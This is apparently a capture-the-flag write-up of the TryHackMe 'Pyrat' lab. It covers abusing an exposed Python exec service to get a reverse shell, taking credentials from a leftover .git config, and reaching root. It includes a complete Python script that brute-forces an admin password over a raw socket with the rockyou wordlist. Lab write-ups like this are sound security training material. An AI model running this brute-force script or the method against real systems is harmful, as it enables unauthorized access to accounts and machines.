---
Title: "Pyrat — TryHackMe Writeup"
Author: Cankun Wang
date: 2025-11-06
tags: [tryhackme, writeup, rce]

---

Let's first take a look at task.

"Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine."

#Scaning network

Our first task is clear. Let's take a look at the target on browser. 

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-21-26-54-image.png)

How about using nmap to scan? 

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-21-27-46-image.png)

We find two ports. Let's try to access these two ports.

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-21-34-34-image.png)

The target wants a more basic connection. Let's use the netcat to connect. 

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-21-44-04-image.png)

Looks like netcat works. 

Let's try a simple python code. 

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-21-44-58-image.png)

It works. Now we know hot to gain a reverse shell.

#Exploit

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-21-56-22-image.png)

Now we are using a reverse shell of python to gain access.

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-21-57-19-image.png)

Success.

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-21-58-31-image.png)

We are currently running as www-data.

Let's take a look at the task again.

"Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root."

Let's try to find the well-known folder.

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-22-02-46-image.png)

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-22-03-39-image.png)

There is a user called think, but we do not have access to the directory. Let's try another directory---/opt

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-22-05-03-image.png)

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-22-04-47-image.png)

We find a directory--dev. Inside the /dev it has an interesting directory called .git.

![](C:\Users\Administrator\AppData\Roaming\marktext\images\2025-11-05-22-05-51-image.png)

Let's first take a look at commit_editmsg. This file may contain valuable information about past commiting info. 

![](assets/2025-11-06-12-18-30-image.png)

This indicates that currently adding an endpoint that may be give us shell access.

Let's keep exploring other files.

First, we try to explore branches direcotry to see if there are any branches left. But the directory is empty. Let's keep looking at config.

![](assets/2025-11-06-12-22-43-image.png)

We find a user called Jose Mario and his email. Also we find credential---username think and its password.

![](assets/2025-11-06-12-32-46-image.png)

![](assets/2025-11-06-12-32-54-image.png)

Since we don't have permission to /home/think directory, we are trying to use the credentials we find to ssh login as think. 

Now we are able to find the user.txt

#root.txt

Let's go back to find the sensitive infomation in .git directory.

First, let's view the current commit message.

![](assets/2025-11-06-12-49-36-image.png)

git logs gives us the current commit info.

Let's view this commit.

![](assets/2025-11-06-12-50-07-image.png)

![](assets/2025-11-06-12-50-19-image.png)

![](assets/2025-11-06-12-50-28-image.png)

There are potential vulnerabilities. First, if the data send is "some_endpoint", the code will run get_this_endpoint(client_socket); Second, if the data is shell, it will call the shell.

Third, for other data, it will exec_python. However, there are some vulnerabilities. First, exec_python may allow the execution of any python code. Second, if the socket connection is established, we are allowed to execute any command in target.

Let's try to exploit this.

![](assets/2025-11-06-13-10-46-image.png)

Success. Using "shell" allow us gain a shell in target as www-data, which validate our indication.

Now, let' try to do a simple endpoint fuzzing to the target.

![](assets/2025-11-06-13-34-08-image.png)

I write a sciprt to fuzz the endpoint.

![](assets/2025-11-06-13-35-16-image.png)

Except the password, all other is not defined.

Let's try to find the password.

![](assets/2025-11-06-14-03-37-image.png)

![](assets/2025-11-06-14-03-51-image.png)

![](assets/2025-11-06-14-04-02-image.png)

---

import socket  
import time  

target_ip = "10.10.189.255"  
target_port = 8000  
password_wordlist = "/usr/share/wordlists/rockyou.txt"  
username = "admin"  
timeout = 4.0  
enc = "utf-8"  
success_keywords = ["success", "welcome", "logged in", "admin"]  

def recv_all(sock, timeout_short=0.5):  
    sock.settimeout(timeout_short)  
    data = b""  
    try:  
        while True:  
            chunk = sock.recv(4096)  
            if not chunk:  
                break  
            data += chunk  
            time.sleep(0.01)  
    except socket.timeout:  
        pass  
    except Exception:  
        pass  
    try:  
        return data.decode(enc, errors="replace")  
    except:  
        return ""  

def attempt(password):  
    try:  
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        s.settimeout(timeout)  
        s.connect((target_ip, target_port))  
        banner = recv_all(s, 0.5)  
        s.sendall((username + "\n").encode(enc))  
        prompt = recv_all(s, 0.5)  
        s.sendall((password + "\n").encode(enc))  
        resp = recv_all(s, 1.0)  
        s.close()  
        return (banner + prompt + resp).lower()  
    except Exception as e:  
        try:  
            s.close()  
        except:  
            pass  
        return f"[ERROR] {e}"  

def main():  
    try:  
        with open(password_wordlist, "r", encoding="latin-1", errors="ignore") as f:  
            words = [line.strip() for line in f if line.strip()]  
    except Exception as e:  
        print(f"Failed to open wordlist: {e}")  
        return  

    baseline = attempt("baseline_test")  
    print("BASELINE:")  
    print(baseline[:300])  
    print("STARTING")  
    for i, pwd in enumerate(words, 1):  
        out = attempt(pwd)  
        is_success = any(k in out for k in success_keywords)  
        if is_success or (out and out != baseline):  
            print(f"[POSSIBLE] #{i} password='{pwd}'")  
            print(out[:1000])  
            break  
        if i % 1000 == 0:  
            print(f"[INFO] tried {i} passwords, last='{pwd}'")  

if __name__ == "__main__":  
    main()

---

I am using another script to brute force the password of admin. (hydra can't be used in this task because the target is returning simple text, hydra will have false positive cases)

![](assets/2025-11-06-14-05-51-image.png)

We find the password of admin. Let's login and find the root.txt.

![](assets/2025-11-06-14-06-37-image.png)





Thanks for reading!
